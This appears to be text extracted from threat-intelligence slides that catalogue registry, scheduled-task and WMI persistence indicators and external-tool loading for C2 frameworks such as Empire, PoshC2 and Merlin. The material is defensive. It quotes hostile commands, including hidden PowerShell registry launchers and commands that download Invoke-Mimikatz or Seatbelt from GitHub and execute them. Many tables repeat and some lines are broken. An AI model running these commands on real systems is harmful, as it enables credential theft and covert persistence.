HKLM¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Koadic|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Merlin|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|PoshC2|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n\n\n###### Quasar\n\n\n\n###### • HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run\n • HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥RunOnce\n • HKLM¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run\n\n\n-----\n\n|Framework|Registry Key|\n|---|---|\n|AsyncRAT|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|DcRat|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Covenant|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Empire|• HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run • HKLM¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Koadic|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Merlin|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|PoshC2|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n\n\n###### Quasar\n\n\n\n###### • HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run\n • HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥RunOnce\n • HKLM¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run\n\n\n-----\n\n|Framework|Name|Type|\n|---|---|---|\n|AsyncRAT|<Persistent file name>|REG_SZ|\n|DcRat|<Persistent file name>|REG_SZ|\n|Covenant|(default) Updater|REG_EXPAND_SZ|\n|Empire|(default) Updater|REG_SZ|\n|Koadic|K0adic|REG_SZ|\n|Merlin|Update|REG_SZ|\n|PoshC2|IEUpdater|REG_SZ|\n\n\n-----\n\n#### file name\n\n|e name|Col2|Col3|\n|---|---|---|\n|Framework|Name|Type|\n|AsyncRAT|<Persistent file name>|REG_SZ|\n|DcRat|<Persistent file name>|REG_SZ|\n|Covenant|(default) Updater|REG_EXPAND_SZ|\n|Empire|(default) Updater|REG_SZ|\n|Koadic|K0adic|REG_SZ|\n|Merlin|Update|REG_SZ|\n|PoshC2|IEUpdater|REG_SZ|\n\n\n-----\n\n#### value names\n\n|alue names|Col2|Col3|\n|---|---|---|\n|Framework|Name|Type|\n|AsyncRAT|<Persistent file name>|REG_SZ|\n|DcRat|<Persistent file name>|REG_SZ|\n|Covenant|(default) Updater|REG_EXPAND_SZ|\n|Empire|(default) Updater|REG_SZ|\n|Koadic|K0adic|REG_SZ|\n|Merlin|Update|REG_SZ|\n|PoshC2|IEUpdater|REG_SZ|\n\n\n-----\n\n|Framework|Name|Type|\n|---|---|---|\n|AsyncRAT|<Persistent file name>|REG_SZ|\n|DcRat|<Persistent file name>|REG_SZ|\n|Covenant|(default) Updater|REG_EXPAND_SZ|\n|Empire|(default) Updater|REG_SZ|\n|Koadic|K0adic|REG_SZ|\n|Merlin|Update|REG_SZ|\n|PoshC2|IEUpdater|REG_SZ|\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Key|• HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run • HKLM¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Name|（default）Updater|\n|Type|REG_EXPAND_SZ|\n\n\n-----\n\n|Framework|Name|Type|\n|---|---|---|\n|AsyncRAT|<Persistent file name >|REG_SZ|\n|DcRat|<Persistent file name >|REG_SZ|\n|Covenant|(default) Updater|REG_EXPAND_SZ|\n|Empire|(default) Updater|REG_SZ|\n|Koadic|K0adic|REG_SZ|\n|Merlin|Update|REG_SZ|\n|PoshC2|IEUpdater|REG_SZ|\n\n\n-----\n\n|Framework|Registry Value Data|\n|---|---|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|Covenant|<any path>|\n|Empire|• C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKCU:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\" • C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKLM:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\"|\n|Koadic|C:¥Windows¥System32¥mshta.exe %AppData%¥<random filename>.hta|\n|Merlin|wscript %AppData%:<random file name>.vbs|\n\n\n###### PoshC2\n\n\nC:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -exec bypass Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path\n\n\n-----\n\n|Framework|Registry Value Data|\n|---|---|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|Covenant|<any path>|\n|Empire|• C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKCU:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\" • C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKLM:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\"|\n|Koadic|C:¥Windows¥System32¥mshta.exe %AppData%¥<random filename>.hta|\n|Merlin|wscript %AppData%:<random file name>.vbs|\n\n\n###### PoshC2\n\n\nC:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -exec bypass Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path\n\n\n-----\n\n### • AsyncRAT and DcRat are set to persist at build time\n\n#### – %AppData% or %Temp%\n\n### • Only specific directories can be specified in their builders for\n persistence\n\n###### DcRat Builder\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Key|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Name|<any filename>|\n\n\n\n###### • %AppData%¥<any filename>.exe Data\n • %Temp%¥<any filename>.exe\n\n\n-----\n\n|Framework|Registry Value Data|\n|---|---|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|Covenant|<any path>|\n|Empire|• C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKCU:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\" • C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKLM:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\"|\n|Koadic|C:¥Windows¥System32¥mshta.exe %AppData%¥<random filename>.hta|\n|Merlin|wscript %AppData%:<random file name>.vbs|\n\n\n###### PoshC2\n\n\nC:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -exec bypass Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path\n\n\n-----\n\n### • Empire and PoshC2 store data for persistence in the registry\n\n#### – Empire stores a Base64-encoded agent in the registry – PoshC2 stores a Base64-encoded command line in the registry\n that executes PowerShell\n\n### • Persistent launcher reads data from the registry and executes\n it\n\n|Framework|Registry Key|Name|\n|---|---|---|\n|Empire|HKCU¥SOFTWARE¥Microsoft¥Windows¥ CurrentVersion¥|Debug|\n\n\n###### HKCU¥SOFTWARE¥Microsoft¥Windows¥ PoshC2 CurrentVersion¥Themes\n\n\n\n###### • Wallpaper555\n • Wallpaper666\n • Wallpaper777\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Key|• HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion • HKLM¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion|\n|Name|Debug|\n|Data|<base64 encoded script>|\n\n\n-----\n\n-----\n\n###### script += (\n <…snip…> HKCU:Software¥¥Microsoft¥¥Windows¥¥CurrentVersion¥¥Run¥¥ -Name \" + key_name + ' -Value ¥'\"C:¥¥Windows¥¥System32¥¥WindowsPowerShell¥¥v1.0¥¥powershell.exe\" -c \"$x=' + location_string + \";powershell -Win Hidden -enc $x¥\"';\" )\n\n### C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c “$x=((gp HKCU:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\"\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n|Item|Value|\n|Key|• HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run • HKLM¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Name|（default）Updater|\n\n\n###### Data\n\n\n\n- C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp\nHKCU:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden enc $x\"\n\n- C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp\n\n\n-----\n\n|Indicators|s PoshC2|Col3|Col4|Col5|\n|---|---|---|---|---|\n||||||\n||||||\n|Item||Value|||\n|Key||HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Themes|||\n|Name||• Wallpaper555 • Wallpaper666 • Wallpaper777|||\n\n\n###### powershell -exec bypass -Noninteractive -windowstyle hidden -e\n\n\n-----\n\n-----\n\n|Item|Value|\n|---|---|\n|Key|HKCU¥SOFTWARE¥Microsoft¥Windows¥CurrentVersion¥Run|\n|Name|IEUpdate|\n\n\n###### Data\n\n\nC:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -exec bypass Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path\nRegistry::HKCU¥Software¥Microsoft¥Windows¥currentversion¥themes¥).Wallpaper777\n\n\n-----\n\n|Framework|Registry Value Data|\n|---|---|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|Covenant|<any path>|\n|Empire|• C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKCU:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\" • C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKLM:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\"|\n|Koadic|C:¥Windows¥System32¥mshta.exe %AppData%¥<random filename>.hta|\n|Merlin|wscript %AppData%:<random file name>.vbs|\n\n\n###### PoshC2\n\n\nC:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -exec bypass Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path\n\n\n-----\n\n|Framework|Registry Value Data|\n|---|---|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|Covenant|<any path>|\n|Empire|• C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKCU:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\" • C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe\" -c \"x=$((gp HKLM:¥Software¥Microsoft¥Windows¥CurrentVersion debug).debug);powershell -Win Hidden -enc $x\"|\n|Koadic|C:¥Windows¥System32¥mshta.exe %AppData%¥<random filename>.hta|\n|Merlin|wscript %AppData%:<random file name>.vbs|\n\n\n###### PoshC2\n\n\nC:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -exec bypass Noninteractive -windowstyle hidden -c iex (Get-ItemProperty -Path\n\n\n-----\n\n### • Merlin can be persisted using a module Invoke ADSBackdoor.ps1\n • Invoke-ADSBackdoor.ps1 persists in Run key\n • Due to a wrong command line for executing Invoke ADSBackdoor.ps1, its persistence fails\n\n\n-----\n\n###### Technique Count Framework\n\n|Registry Run Key/Startup Folder|9/10|• AsyncRAT • Covenant • DcRat • Empire • Koadic • Merlin • PoshC2 • Quasar • Sliver|\n|---|---|---|\n\n\n###### Scheduled Task/Job 7/10\n\n\n\n###### • AsyncRAT\n • DcRat\n • Empire\n • Koadic\n • PoshC2\n • Quasar\n\n\n-----\n\n### • Tasks are created using schtasks.exe except for Sliver\n\n#### – Sliver uses SharPersist\n\n### • Indicators\n\n#### – Task name – Trigger – Operation\n\n\n-----\n\n|Framework|Name|Triggers|\n|---|---|---|\n|AsyncRAT|<persistence file name>|onlogon|\n|DcRat|<persistence file name>|onlogon|\n|Empire|(default) Updater|(default) Daily 09:00 AM|\n|Koadic|K0adic|onlogon|\n|PoshC2|IEUpdate|onlogon|\n|Quasar|<any name>|onlogon|\n\n\n###### Sliver <any name> • onlogon\n • Hourly\n • Daily execute from 10:00AM to 12:00 PM\n\n\n-----\n\n|Framework|Name|Triggers|\n|---|---|---|\n|AsyncRAT|<persistence file name>|onlogon|\n|DcRat|<persistence file name>|onlogon|\n|Empire|(default) Updater|(default) Daily 09:00 AM|\n|Koadic|K0adic|onlogon|\n|PoshC2|IEUpdate|onlogon|\n|Quasar|<any name>|onlogon|\n\n\n###### Sliver <any name> • onlogon\n • Hourly\n • Daily execute from 10:00AM to 12:00 PM\n\n\n-----\n\n###### Sliver <any name> • onlogon\n • Hourly\n • Daily execute from 10:00AM to 12:00 PM\n\n|Framework|Name|Triggers|\n|---|---|---|\n|AsyncRAT|<persistence file name>|onlogon|\n|DcRat|<persistence file name>|onlogon|\n|Empire|(default) Updater|(default) Daily 09:00 AM|\n|Koadic|K0adic|onlogon|\n|PoshC2|IEUpdate|onlogon|\n|Quasar|<any name>|onlogon|\n|||• onlogon|\n\n\n-----\n\n|Framework|Operation|\n|---|---|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat||\n|Empire|C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -NonI -W hidden - c ¥\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp<registry key path>).<registry name>))|\n|Koadic|C:¥Windows¥system32¥mshta.exe C:¥ProgramData¥ <random filename>.hta|\n|PoshC2|powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get- ItemProperty -Path Registry::HKCU¥Software¥Microsoft¥Windows¥currentversion¥themes¥).Wallpaper5 55|\n\n\n###### Quasar\n\n\n\n- %AppData%¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Windows¥System32¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Program Files¥<(option) any subdir>¥<any filename>.exe\n\n\n-----\n\n|key|Col2|\n|---|---|\n|Framework|Operation|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat||\n|Empire|C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -NonI -W hidden - c ¥\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp<registry key path>).<registry name>))|\n|Koadic|C:¥Windows¥system32¥mshta.exe C:¥ProgramData¥ <random filename>.hta|\n|PoshC2|powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get- ItemProperty -Path Registry::HKCU¥Software¥Microsoft¥Windows¥currentversion¥themes¥).Wallpaper5 55|\n\n\n###### Quasar\n\n\n\n- %AppData%¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Windows¥System32¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Program Files¥<(option) any subdir>¥<any filename>.exe\n\n\n-----\n\n|Framework|Operation|\n|---|---|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat||\n|Empire|C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -NonI -W hidden - c ¥\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp<registry key path>).<registry name>))|\n|Koadic|C:¥Windows¥system32¥mshta.exe C:¥ProgramData¥ <random filename>.hta|\n|PoshC2|powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get- ItemProperty -Path Registry::HKCU¥Software¥Microsoft¥Windows¥currentversion¥themes¥).Wallpaper5 55|\n\n\n###### Quasar\n\n\n\n- %AppData%¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Windows¥System32¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Program Files¥<(option) any subdir>¥<any filename>.exe\n\n\n-----\n\n|PoshC2 reads agent|“Wallpaper555” registry value to execute an|\n|---|---|\n|Framework|Operation|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat||\n|Empire|C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -NonI -W hidden - c ¥\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp<registry key path>).<registry name>))|\n|Koadic|C:¥Windows¥system32¥mshta.exe C:¥ProgramData¥ <random filename>.hta|\n|PoshC2|powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get- ItemProperty -Path Registry::HKCU¥Software¥Microsoft¥Windows¥currentversion¥themes¥).Wallpaper5 55|\n\n\n###### Quasar\n\n\n\n- %AppData%¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Windows¥System32¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Program Files¥<(option) any subdir>¥<any filename>.exe\n\n\n-----\n\n|schtasks.exe|Col2|\n|---|---|\n|Framework|Operation|\n|AsyncRAT|• %AppData%¥<any filename>.exe • %Temp%¥<any filename>.exe|\n|DcRat||\n|Empire|C:¥Windows¥System32¥WindowsPowerShell¥v1.0¥powershell.exe -NonI -W hidden - c ¥\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp<registry key path>).<registry name>))|\n|Koadic|C:¥Windows¥system32¥mshta.exe C:¥ProgramData¥ <random filename>.hta|\n|PoshC2|powershell -exec bypass -Noninteractive -windowstyle hidden -c iex (Get- ItemProperty -Path Registry::HKCU¥Software¥Microsoft¥Windows¥currentversion¥themes¥).Wallpaper5 55|\n\n\n###### Quasar\n\n\n\n- %AppData%¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Windows¥System32¥<(option) any subdir>¥<any filename>.exe\n\n- C:¥Program Files¥<(option) any subdir>¥<any filename>.exe\n\n\n-----\n\n|Technique|Count|Framework|\n|---|---|---|\n|WMI Event Subscription|4/10|• Covenant • Empire • Koadic • PoshC2|\n|Windows Service|4/10|• Covenant • Havoc • PoshC2 • Sliver|\n|Component Object Model Hijacking|1/10|• Covenant|\n|Image File Execution Options Injection|1/10|• Empire|\n\n\n-----\n\n### • Administrative privileges are required to register a WMI Event\n Subscription\n • All frameworks use WQL for EventFilter\n • Indicators\n\n#### – Name – Query\n\n\n-----\n\n|Framework|Name|Query|\n|---|---|---|\n|Covenant|<any name>|select * from Win32_ProcessStartTrace where ProcessName = ‘<any process name>’;|\n|Empire|(default) Updater|(default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325|\n|Koadic|K0adic|SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300\";|\n\n\n###### PoshC2 backup\n\n\n###### (default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance Minute = 30 GROUP WITHIN 60\n\n\n-----\n\n#### other persistence mechanisms\n\n|Framework|Name|Query|\n|---|---|---|\n|Covenant|<any name>|select * from Win32_ProcessStartTrace where ProcessName = ‘<any process name>’;|\n|Empire|(default) Updater|(default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325|\n|Koadic|K0adic|SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300\";|\n\n\n###### PoshC2 backup\n\n\n###### (default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance Minute = 30 GROUP WITHIN 60\n\n\n-----\n\n|Framework|Name|Query|\n|---|---|---|\n|Covenant|<any name>|select * from Win32_ProcessStartTrace where ProcessName = ‘<any process name>’;|\n|Empire|(default) Updater|(default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325|\n|Koadic|K0adic|SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300\";|\n\n\n###### PoshC2 backup\n\n\n###### (default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance Minute = 30 GROUP WITHIN 60\n\n\n-----\n\n|Framework|Name|Query|\n|---|---|---|\n|Covenant|<any name>|select * from Win32_ProcessStartTrace where ProcessName = ‘<any process name>’;|\n|Empire|(default) Updater|(default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325|\n|Koadic|K0adic|SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300\";|\n\n\n###### PoshC2 backup\n\n\n###### (default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance Minute = 30 GROUP WITHIN 60\n\n\n-----\n\n###### private static ManagementObject CreateEventFilter(string EventName, EventFilter\n\n\n###### EventFilter, string ProcessName) { ManagementObject _EventFilter = null; try {\n\n\n### WMI Query in source code is\n\n\n### written in capital letters\n\n###### string query = string.Empty; if (EventFilter == EventFilter.ProcessStart) {\n\n\n###### query = $@\"SELECT * FROM Win32_ProcessStartTrace WHERE\n ProcessName='{ProcessName}’”; }\n _EventFilter = wmiEventFilter.CreateInstance(); _EventFilter[\"Name\"] = EventName; _EventFilter[\"Query\"] = wql.QueryString; <…snip…>\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Name|<any name>|\n|Query|select * from Win32_ProcessStartTrace where ProcessName = ‘<any process name>’;|\n\n\n###### Command d li\n\n\n-----\n\n|Framework|Name|Query|\n|---|---|---|\n|Covenant|<any name>|select * from Win32_ProcessStartTrace where ProcessName = ‘<any process name>’;|\n|Empire|(default) Updater|(default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325;|\n|Koadic|K0adic|SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300\";|\n\n\n###### PoshC2 backup\n\n\n###### (default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance Minute = 30 GROUP WITHIN 60\n\n\n-----\n\n|Framework|Name|Query|\n|---|---|---|\n|Covenant|<any name>|select * from Win32_ProcessStartTrace where ProcessName = ‘<any process name>’;|\n|Empire|(default) Updater|(default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325|\n|Koadic|K0adic|SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300\";|\n\n\n###### PoshC2 backup\n\n\n###### (default) SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance Minute = 30 GROUP WITHIN 60\n\n\n-----\n\n# Threat Intelligence ~ Indicators of External Tools Usage ~\n\n\n-----\n\n### • Many frameworks can utilize external tools as modules\n\n#### – There are many credential theft tools such as Mimikatz and Rubeus\n\n### • The use of external tools may be recorded in event logs as\n indicators\n • Patterns that remain as an indicator for each framework\n\n|Pattern|Framework|\n|---|---|\n|Download external tools|• Merlin|\n|Load external tools|• Empire • Koadic • Merlin • PoshC2|\n\n\n-----\n\n### • Merlin downloads external tools from GitHub\n\n#### – Not from C&C server\n\n### • External tools are downloaded using PowerShell\n\n#### – Tools are loaded using Invoke-Expression after they are\n downloaded – Tools are compiled and executed using csc.exe after they are\n downloaded\n\n### • Due to misconfigurations in their command lines, some tools\n may fail to execute\n\n#### – Since processes are created, the attempts of their execution are\n logged in the event log\n\n\n-----\n\n###### \"commands\": [\n \"powershell.exe\", Download the tool from GitHub and \"-nop\",\n\n### run it with Invoke-Expression\n\n###### \"-WindowStyle\", \"0\", \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC- SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke- Mimikatz.ps1');\",\n\n\n###### \"Invoke-Mimikatz\", \"{{DumpCreds.Flag}}\", \"{{DumpCerts.Flag}}\", \"{{Command}}\", \"{{ComputerName}}\" ]\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|<Merlin process>|\n\n\n###### Command Line\n\n\n\n###### • powershell.exe -nop -WindowsStyle 0 \"IEX (New-Object Net.WebClient).DownloadString('<GitHub URL>');\" <Tool Function> po ershell e e nop 0 “IEX (Ne Object\n\n\n-----\n\n###### \"commands\": [\n \"powershell.exe\", \"-nop\", \"-w 1\", \"¥\"\", \"(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/Seatbelt/master/S eatbelt/Program.cs', $env:APPDATA+'¥¥¥¥{{FileName.Value}}.cs');\",\n \"$f=(Get-Content $env:APPDATA¥¥¥¥{{FileName.Value}}.cs);\", \"$f=($f -replace 'UInt32','uint');\", \"$f=($f -replace 'UInt64','ulong');\", \"Set-Content -Path $env:APPDATA¥¥¥¥{{FileName.Value}}.cs $f;\", \"c:¥¥¥¥Windows¥¥¥¥Microsoft.NET¥¥¥¥Framework64¥¥¥¥{{.NetVersion.Value}}¥¥¥¥csc.exe /unsafe /nowarn:0649 /out:$env:APPDATA¥¥¥¥{{FileName.Value}}.exe $env:APPDATA¥¥¥¥{{FileName.Value}}.cs;\",\n \"&$env:APPDATA¥¥¥¥{{FileName.Value}}.exe\", <…snip…>\n \";del $env:APPDATA¥¥¥¥{{FileName.Value}}.*\", \"¥\"\" ]\n\n\n-----\n\n###### \"$f=(Get-Content $env:APPDATA¥¥¥¥{{FileName.Value}}.cs);\", \"$f=($f -replace 'UInt32','uint');\", \"$f=($f -replace 'UInt64','ulong');\", \"Set-Content -Path $env:APPDATADownload the tool from GitHub and save to %AppData%¥¥¥¥{{FileName.Value}}.cs $f;\", \"c:¥¥¥¥Windows¥¥¥¥Microsoft.NET¥¥¥¥Framework64¥¥¥¥{{.NetVersion.Value}}¥¥¥¥csc.exe /unsafe /nowarn:0649 /out:$env:APPDATA¥¥¥¥{{FileName.Value}}.exe $env:APPDATA¥¥¥¥{{FileName.Value}}.cs;\",\n \"&$env:APPDATA¥¥¥¥{{FileName.Value}}.exe\", <…snip…>\n \";del $env:APPDATA¥¥¥¥{{FileName.Value}}.*\", \"¥\"\" ]\n\n\n-----\n\n###### \"&$env:APPDATA¥¥¥¥{{FileName.Value}}.exe\", <…snip…>\n\n\n###### \";del $env:APPDATA¥¥¥¥{{FileName.Value}}.*\", \"¥\"\" ]\n\n\n-----\n\n###### \";del $env:APPDATA¥¥¥¥{{FileName.Value}}.*\", \"¥\"\" ]\n\n\n-----\n\n|Item|Value|\n|---|---|\n|Parent Process|<Merlin process>|\n\n\n###### Command Line\n\n\n###### powershell.exe -nop \"-w 1\" ¥\" \"(New-Object Net.WebClient).DownloadString('<Github URL>', $env:APPDATA+’¥¥<Filename>.cs <…snip…>\n\n\n-----\n\n### • Empire, Merlin and PoshC2 use PowerShell to call external tools\n\n#### – Invoke-Mimikatz, Invoke-Inveigh, etc …\n\n### • Loaded PowerShell tools are logged in the event log\n\n#### – PowerShell tool function names will be the indicators\n\n### • List of function names that may be used as indicators is in the\n Appendix of this 